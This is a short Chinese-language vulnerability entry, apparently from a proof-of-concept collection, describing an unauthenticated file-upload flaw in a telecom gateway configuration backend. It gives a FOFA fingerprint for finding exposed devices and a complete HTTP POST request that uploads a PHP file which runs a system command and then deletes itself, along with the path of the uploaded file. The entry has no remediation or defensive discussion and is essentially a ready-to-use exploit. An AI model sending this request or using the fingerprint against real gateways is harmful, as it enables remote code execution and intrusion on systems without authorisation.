## 电信网关配置管理后台upload_channels.php接口存在文件上传漏洞

电信网关配置管理系统/bak_manager/upload_channels.php 接口存在文件上传漏洞,未经身份验证的远程攻击者可以利用文件上传漏洞获取系统权限。

## fofa

```javascript
body="a:link{text-decoration:none;color:orange;}"
```

## poc

```jinja2
POST /bak_manager/upload_channels.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

------WebKitFormBoundaryssh7UfnPpGU7BXfK
Content-Disposition: form-data; name="file"; filename="rce.php"
Content-Type: text/plain

<?php system("uname -a");unlink(__FILE__);?>
------WebKitFormBoundaryssh7UfnPpGU7BXfK--
```

![image-20241108205412226](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411082054279.png)

文件路径：`/bak_manager/rce.php`